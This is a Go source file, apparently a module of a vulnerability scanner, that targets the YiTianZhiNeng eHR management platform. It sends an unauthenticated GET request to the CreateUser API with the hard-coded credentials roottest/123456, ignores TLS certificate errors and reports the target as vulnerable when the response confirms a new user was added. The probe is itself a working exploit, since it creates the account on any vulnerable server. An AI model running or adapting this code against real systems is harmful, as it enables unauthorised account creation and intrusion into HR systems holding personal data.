package CVEs

import (
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"
	"time"
)

func YiTianZhiNeng_AnyUserAdd(url string, Attack bool) error {
	url1 := fmt.Sprintf("%s/BaseManage/UserAPI/CreateUser?Account=roottest&Password=123456&OuterID=888", url)
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}

	client := &http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
		Transport: tr,
		Timeout:   10 * time.Second, // 设置超时时间为 10 秒
	}

	request, err := http.NewRequest("GET", url1, nil)
	if err != nil {
	}

	response, err := client.Do(request)
	if err != nil {
		return err
	}
	body, err := ioutil.ReadAll(response.Body)
	if err != nil {
		return err
	}

	if response.StatusCode == 200 && strings.Contains(string(body), "用户新增") {
		fmt.Println("[*]易天智能 eHR管理平台任意用户添加漏洞 : " + url)
		if Attack {
			fmt.Println(fmt.Sprintf("Attack-Result : %s/BaseManage/UserAPI/CreateUser?Account=roottest&Password=123456&OuterID=888\n", url))
		}
	}

	defer response.Body.Close()

	return nil
}
